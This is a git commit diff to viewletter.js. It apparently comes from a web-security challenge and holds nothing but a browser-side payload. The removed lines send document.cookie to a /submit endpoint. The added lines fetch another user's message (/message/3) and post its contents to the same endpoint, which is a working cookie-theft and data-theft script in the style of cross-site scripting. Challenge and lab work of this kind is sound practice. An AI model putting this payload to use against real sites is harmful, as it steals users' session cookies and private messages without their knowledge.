d1a7e02cf0f5fe54b7bd3b7ef29adac5bc605886
s5003597 <33131853+s5003597@users.noreply.github.com>
2023-02-09 20:53:33 +0000

    Update viewletter.js

--- viewletter.js
+++ viewletter.js
@@ -1,7 +1,9 @@
-fetch('http://127.0.0.1/submit', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({"message": document.cookie})
-}).then(res => res.json()).then(res => console.log(res));
+fetch('http://127.0.0.1/message/3').then((response) => response.json()).then((data) => {
+    fetch('http://127.0.0.1/submit', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({"message": data})
+    }).then(res => res.json()).then(res => console.log(res));
+});
